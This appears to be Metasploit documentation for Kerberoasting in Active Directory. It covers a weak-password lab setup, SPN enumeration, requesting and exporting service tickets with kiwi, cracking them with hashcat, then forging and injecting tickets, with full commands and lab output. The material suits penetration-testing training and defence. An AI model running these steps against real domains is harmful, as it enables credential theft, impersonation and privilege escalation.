## Kerberoasting

Kerberoasting is a technique that finds Service Principal Names (SPN) in Active Directory that are associated with
normal user accounts on the domain, and then requesting Ticket Granting Service (TGS) tickets for those accounts from
the KDC. These TGS tickets are encrypted with the Service's password, which may be weak - and susceptible to brute force
attacks.

Services are normally configured to use computer accounts which have very long and secure passwords, but services
associated with normal user accounts will have passwords entered by a human and may be short and weak - and a good
target for brute attacks.

If successful, the attacker possesses user credentials that can be used to impersonate the account owner. Now the attacker
appears to be an approved and legitimate user - having access to the same privileges, assets, systems, etc, that have
been granted to the compromised account, boom roasted.

## Vulnerable Targets

Any system leveraging Kerberos as a means of authentication e.g. Active Directory, MSSQL, which have Service Principal
Names (SPN) associated with normal user accounts on the domain.

## Lab Environment

For testing purposes on an Active Directory environment you can create a user account and register an SPN manually as an
example of this technique:

```
# Create a basic user account with a weak password for our service
net user /add svc_kerberoastable password123

# Mark the account and password as never expiring, to ensure the lab setup still works in the future
net user svc_kerberoastable /expires:never
powershell /c Set-AdUser -Identity svc_kerberoastable -PasswordNeverExpires $true

# Create a Service Principal Name which uses the user account with a weak password
cmd /c setspn -a %computername%/svc_kerberoastable.%userdnsdomain%:1337 %userdomain%\svc_kerberoastable
```

## Scenarios

### Using get_user_spns

The easiest way to enumerate Kerberoastable accounts is with the `auxiliary/gather/get_user_spns` module which internally leverages Impacket.
This module will automatically query LDAP for Kerberoastable SPNs and request a Kerberos service ticket that may be encrypted using the weak password
which can be bruteforced:

```
use auxiliary/gather/get_user_spns
run rhost=192.168.123.13 user=<username> pass=<password> domain=<domain>
```

If you followed the lab setup setup above, this should output the following result:

```msf
msf6 auxiliary(gather/get_user_spns) > run rhost=192.168.123.13 user=Administrator pass=p4$$w0rd domain=adf3.local

[*] Running for 192.168.123.13...
[+] ServicePrincipalName                    Name                MemberOf  PasswordLastSet             LastLogon  Delegation
[+] --------------------------------------  ------------------  --------  --------------------------  ---------  ----------
[+] DC3/svc_kerberoastable.ADF3.LOCAL:1337  svc_kerberoastable            2023-01-23 23:52:19.445592  <never>
[+] $krb5tgs$23$*svc_kerberoastable$ADF3.LOCAL$adf3.local/svc_kerberoastable*$c2e73c1dcdcef4c926cb263abedf75ed$263fea3ad446bd6b4b8... etc etc ...
```

The final line contains the service ticket hash in a crackable format. Next paste this hash `$krb5tgs$23$*svc_kerberoastable$ADF3.LOCAL$adf3.local/svc_kerberoastable*$c2e73c1..etc etc...` into a new file called `hash.txt`
You can run Hashcat to crack the hash with a wordlist of choice, and see if the status of the hash has been marked as cracked:

```
$ hashcat -m 13100 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt
... etc ...
Session..........: hashcat
Status...........: Cracked
... etc ...
```

If the password has been cracked you can view the result at a later date with the above command and `--show` appended:

```
$ hashcat -m 13100 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show
$krb5tgs$23$*svc_kerberoastable$ADF3.LOCAL$adf3.local/svc_kerberoastable*$c2e73c1dcdcef4c926cb...etc etc...:password123
                                                                                                         ^ cracked password
```

Now that you have access to the password of the service account, you can use this to enumerate further in the AD environment.

### Manual workflow

An alternative to the easier `get_user_spns` module above is the more manual process of running the LDAP query module to
find Kerberoastable accounts, requesting service tickets with Kiwi, converting the Kiwi ticket to a format usable by hashcat,
and cracking the hash.

1. Start msfconsole
2. Obtain SPNs associated with user accounts from your target
   1. Do: `use auxiliary/gather/ldap_query`
   2. Do: `set action ENUM_USER_SPNS_KERBEROAST`
   3. Run the module and note the discovered SPNs
3. From your Meterpreter session:
   1. Do: `load kiwi`
   2. Do: Request a kerberos ticket for SPN found by the ldap_query module: `kiwi_cmd kerberos::ask /target:https/TSTWLPT1000000`
   3. Do: `kerberos_ticket_list`
4. Export service tickets using the kiwi extension
   1. Do: `kiwi_cmd kerberos::list /export`
5. Crack the encrypted password in the service ticket using tgsrepcrack.py (more info on this python script below)
   1. Do:  `python3 tgsrepcrack.py passlist.txt 1-40a10000-Administrator@HTTP\~testService-EXAMPLE.COM.kirbi`
6. Rewrite the service tickets using kerberoast.py (more info on this python script below)
   1. Do:  `python3  kerberoast.py -p N0tpassword! -r 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi -w Administrator.kirbi -u 500`
7. Finally inject the ticket back into RAM using Meterpreter's kiwi extension
   1. `meterpreter > kiwi_cmd kerberos::ptt Administrator.kirbi`

First an SPN needs to be found. This can be done in a number of ways - including using metasploit's
very own `auxiliary/gather/ldap_query` module:

```msf
msf6 > use auxiliary/gather/ldap_query
msf6 auxiliary(gather/ldap_query) > set RHOSTS 172.16.199.235
RHOSTS => 172.16.199.235
msf6 auxiliary(gather/ldap_query) > set BIND_DN DARWIN_CLAY
BIND_DN => DARWIN_CLAY
msf6 auxiliary(gather/ldap_query) > set BIND_PW N0tpassword!
BIND_PW => N0tpassword!
msf6 auxiliary(gather/ldap_query) > set action ENUM_USER_SPNS_KERBEROAST
action => ENUM_USER_SPNS_KERBEROAST
msf6 auxiliary(gather/ldap_query) > run
[*] Running module against 172.16.199.235

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[*] 172.16.199.235:389 Getting root DSE
dn:
namingcontexts: DC=example,DC=com
namingcontexts: CN=Configuration,DC=example,DC=com
namingcontexts: CN=Schema,CN=Configuration,DC=example,DC=com

...

======================================================================

 Name                  Attributes
 ----                  ----------
 cn                    BERYL_SAVAGE
 samaccountname        BERYL_SAVAGE
 serviceprincipalname  CIFS/OGCWLPT1000000

CN=CAITLIN_CAMPBELL OU=Devices OU=FIN OU=Tier 1 DC=example DC=com
=================================================================

 Name                  Attributes
 ----                  ----------
 cn                    CAITLIN_CAMPBELL
 samaccountname        CAITLIN_CAMPBELL
 serviceprincipalname  ftp/BDEWSECS1000000

CN=NETTIE_BURNS OU=ITS OU=Stage DC=example DC=com
=================================================

 Name                  Attributes
 ----                  ----------
 cn                    ALBERTO_OLSEN
 samaccountname        ALBERTO_OLSEN
 serviceprincipalname  https/TSTWWKS1000002

CN=LESSIE_PHILLIPS OU=Test OU=GOO OU=Stage DC=example DC=com
============================================================

```

Great, we now have a couple SPNs to move forward with.

**Request Service Tickets - with kiwi**

If you have a running Meterpreter session you can request a Service Ticket using the kiwi extension and one of the SPNs
found above:

```msf
meterpreter > load kiwi
Loading extension kiwi...

  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > kiwi_cmd kerberos::ask /target:https/TSTWLPT1000000
Asking for: https/TSTWLPT1000000
   * Ticket Encryption Type & kvno not representative at screen

	   Start/End/MaxRenew: 12/16/2022 4:58:34 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
	   Service Name (02) : https ; TSTWLPT1000000 ; @ EXAMPLE.COM
	   Target Name  (02) : https ; TSTWLPT1000000 ; @ EXAMPLE.COM
	   Client Name  (01) : Administrator ; @ EXAMPLE.COM
	   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
	   Session Key       : 0x00000017 - rc4_hmac_nt
	     07137dd7d5b801ef8b05c73380b18701
	   Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 0	[...]

```

Tickets in the current session can be viewed like so:

```msf
meterpreter > kerberos_ticket_list
[+] Kerberos tickets found in the current session.
[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 12/16/2022 3:35:41 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
   Server Name       : krbtgt/EXAMPLE.COM @ EXAMPLE.COM
   Client Name       : Administrator @ EXAMPLE.COM
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 12/16/2022 4:58:34 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
   Server Name       : https/TSTWLPT1000000 @ EXAMPLE.COM
   Client Name       : Administrator @ EXAMPLE.COM
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
```

**Export Service Tickets**

```msf
meterpreter > kiwi_cmd kerberos::list /export

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 12/16/2022 4:58:34 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
   Server Name       : https/TSTWLPT1000000 @ EXAMPLE.COM
   Client Name       : Administrator @ EXAMPLE.COM
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
====================
Base64 of file : 1-40a10000-Administrator@https~TSTWLPT1000000-EXAMPLE.COM.kirbi
====================
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
MDAwMA==
====================

   * Saved to file     : 1-40a10000-Administrator@https~TSTWLPT1000000-EXAMPLE.COM.kirbi
```

**Crack Kiwi's Service Tickets**

To crack the service ticket a number of tools can be used. In this example we'll use hashcat. First we need to convert
the ticket we retrieved in the `.kirbi` format to a format parsable by hashcat. The script **kirbi2john** is part of
[Tim Medin](https://twitter.com/TimMedin) [Kerberoast](https://github.com/nidem/kerberoast) toolkit is perfect for
this task.

First clone the repo then run the script against the `.kirbi` file.

```
msfuser@ubuntu:~/git$ git clone https://github.com/nidem/kerberoast.git
msfuser@ubuntu:~/git$ cd kerberoast
msfuser@ubuntu:~/git/kerberoast$ python3 kirbi2john.py ~/1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi
$krb5tgs$23$*1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM*$2b5cda0496cdd9cfb11a00a9b03a0d31$76975a9115860927140
3a1808746b35d0e99159553e3c81a9cd32a51e968a4b45ce3fcf08e5eac8d4551df10c9f1bd4572cc273d1bd154fc8fd1228d55cd39a90b64ec3117f
e0a1fb496d1be4042ccb2998d998fa3de8f50bcb04d3bf78e34be07d71310a3be829e24cb75c398847f960aefe9669534df26344beb6e7bbe628b7ac
fa957c4a67417546fc441b84aaee78a0e5256cc9dead287327ac7907af71e02b142027c9061515c72ef03c842d0f73754f9dffa434a26057df4c4434
71cd5bf76260469ea6f1c367a64ea02b01a2b9c2b83979911fc58fa8822c70877b72370078e3d7955fc2ade02acd2a803889a8c3a609f80f9beb45c0
981aba6bdbb208fa6ea2cc91814c8c4dd6e9287f4ef3b9e2b7febe07648c78ec25137e82bee0d99290a33fd3701953bd858fac15c6d1652f11cc75a6
e419cab7dec019e599eda3a76652475968bc2845fa6f02477efaecfd63e58fad817f1976adeda14b2c4c1508a84df1813e05368c3e07c9f656d5730d
848b86c59bf576f4c2505375b7d6934abf8a955b1a71d802026383cbd9005bf12f0664ffc25ebee8aef4b574dd93850d59fc16c5f9881e9b4f957c33
74724e4046c0fa4bc5ff16b9a960b4b6a2ede25bb18c617c2dbcfb3fd34a4cc3ee29fb0f6e6f43722ffc50ceddce55b2be1a53361d13c983980d3191
86c7dbd124a3c8f19560e88d0d858b0f5320738931bf2f32c1e893fbbadb92f7574128f6f36a0acab99023f79d857f15f0920a1a76b3a97e6282d4e6
c5ef30206444bc20da1a7d89d1007a97e75ffb9554cfeaf6757919a635dbdfcfd74d2eec8d5f83f109beb6e653a8c0e787ec039c7bb93d07a60e8bb4
b56d026e809a80e020875a3a382b367f28c0e41714bd5ef97da578956cba12ab1fbcd84a5313d2edc5f7c601c3c56860a347ab013f50e3f8e6167935
9db05e4014db38e21a814fe002ba14d17840aa053bbec3a6aadec31db50827168d24107486d373567c2969215c0decf639bc46b9968e43a79bc6f261
2544feb09908118615035f630e37b03cb04d9725d2085a28543575d91c361bf1b6a61837d6c34c8961df33d1b8b45963bf361d33e0ca2fa37b40e62b
6389ebb0ad4097036f4d6aa4598086313ea79d68f75301d5038783567c2fdcf25e2b459acdc867c64613fe84f3faf1fdb79fc6e05322b2175eec3b2e
84e3a8165f0af265d3ccd994712704516f0c78f76dd7c5c98f8fc8b9db1231f19c259bc7f078a86d4bc6cf06b8c4158dc41f48dd51b146d3fc63d2fd
f057e6644f838a944de0679ab3e8c6290d4d8004bd53570f61323eeb7c910c6546880a508172bf4ee2fa1c87748ec0e2e2f79e03e963affb593f1391
a62fdf2f29b792b1c0e7ece2645381a4284b56ddc525c842589eca39efa0466418c9bfb60df479015f4fac86d38575aad1f29674a12d873f8fc12415
b6ea7b2cb15c9d422f0f904a6af518f12c4e0e362093d8d33a47672973f6d70e80669666f37d6674ef8e2999c92fa38b5de8e266716bb182527bde17
36bcb926a6340ae92f8b338be2fe5fa3a757894679beba5b296fe0cdc11100b9a536264cb5e3cb3c6d0426acaa7dd3928895d32973fab2698d17fff4
f9f1ecd02102f5bbd222b039ca3e30fed4003be6b70b2e492c8ea5eee92439681d6af767547609a87d47b68ba7ca62dbe3e4bf74e081915ab15e4103
8839b74263ddbd087c90b6262dd5684e078068c28ccc0c115e3
tickets written: 1
```

Copy the above hash to a file called hash.txt.

Ensure hashcat is installed: `msfuser@ubuntu:~/git/kerberoast$ sudo apt install hashcat`

With a word list of your choice run the following command:

```
msfuser@ubuntu:~/git/kerberoast$ hashcat -m 13100 --force -a 0 hash.txt wordlist.txt
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 16384/41063 MB allocatable, 6MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64
 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3
 -D DGST_ELEM=4 -D KERN_TYPE=13100 -D _unroll'
 
* Device #1: Kernel m13100_a0-pure.64a04b9e.kernel not found in cache! Building may take a while...
Dictionary cache built:
* Filename..: wordlist.txt
* Passwords.: 3
* Bytes.....: 33
* Keyspace..: 3
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.

$krb5tgs$23$*1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM*$2b5cda0496cdd9cfb11a00a9b03a0d31$76975a9115860927140
<truncated due to size>

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*1-40a10000-Administrator@HTTP~testServ...c115e3
Time.Started.....: Tue Jan 10 07:41:11 2023 (0 secs)
Time.Estimated...: Tue Jan 10 07:41:11 2023 (0 secs)
Guess.Base.......: File (wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       26 H/s (0.03ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 3/3 (100.00%)
Rejected.........: 0/3 (0.00%)
Candidates.1.....: test123  -> N0tpassword!
```

If you want to view the hash + cracked password at a later date run the above command with `--show` appended.

```
msfuser@ubuntu:~/git/kerberoast$ hashcat -m 13100 --force -a 0 hash.txt wordlist.txt --show
$krb5tgs$23$*1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM*$2b5cda0496cdd9cfb11a00a9b03a0d31$76975a9115860927140
<truncated due to size>
39efa046757894679beba5b296fe0cdc11100b9a536264cb5e3cb3c6d0426acaa7dd3928895d32973fab2695476093ddbd087c115e3:N0tpassword!
```

**Rewrite Service Tickets & RAM Injection**

Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible
to rewrite the ticket with [Kerberoast](https://github.com/nidem/kerberoast) python script. This tactic will allow users
to impersonate any domain user or a fake account when the service is going to be accessed. Additionally privilege
escalation is also possible as the user can be added into an elevated group such as Domain Admins.

```
➜  kerberoast git:(master) ✗ python3  kerberoast.py -p N0tpassword! -r 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi -w Administrator.kirbi -u 500
```

The new ticket can be injected back into the memory with the following Mimikatz command in order to perform
authentication with the targeted service via Kerberos protocol.

```msf
meterpreter > kiwi_cmd kerberos::ptt Administrator.kirbi
```
